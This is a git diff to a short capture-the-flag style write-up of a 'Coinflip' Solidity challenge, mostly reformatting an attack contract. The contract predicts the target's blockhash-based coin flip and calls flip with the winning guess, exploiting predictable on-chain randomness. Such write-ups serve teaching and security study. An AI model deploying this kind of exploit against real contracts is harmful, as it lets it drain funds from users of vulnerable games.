@@ -18,8 +18,8 @@ The Coinflip task is a smart contract that has a flip function. It retrieves the
 
 There is no randomness because another contract can make the same calculation and therefore predict the outcome and always win.
 
-```mermaid
-
+```apache
+// SPDX-License-Identifier: MIT
 pragma solidity 0.8.17;
 
 interface CoinFlip {
@@ -35,14 +35,11 @@ contract coinFlipAttack {
     }
 
     function attack()external{
+        uint256 blockValue = uint256(blockhash(block.number -1));
+        uint256 coinFlip = blockValue/FACTOR;
 
-            uint256 blockValue = uint256(blockhash(block.number -1));
-            uint256 coinFlip = blockValue/FACTOR;
-
-            bool result = coinFlip ==1 ? true: false;
-            cf.flip(result);
-
+        bool result = coinFlip ==1 ? true: false;
+        cf.flip(result);
     }
-
 }
 ```
